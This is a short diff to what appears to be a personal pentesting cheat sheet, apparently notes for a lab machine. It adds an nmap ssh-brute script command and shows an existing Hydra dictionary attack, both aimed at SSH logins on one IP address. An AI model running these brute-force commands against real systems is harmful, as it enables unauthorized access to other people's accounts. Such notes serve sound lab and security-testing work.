@@ -2,6 +2,11 @@
 
 ## SSH
 
+### NMAP NSE Brute for SSH
+
+
+sudo nmap 10.10.11.87 --script ssh-brute.nse
+
 ### Dictionary attack with Hydra
 
 hydra ssh://10.10.11.87 -L usernames.txt -P passwords.txt
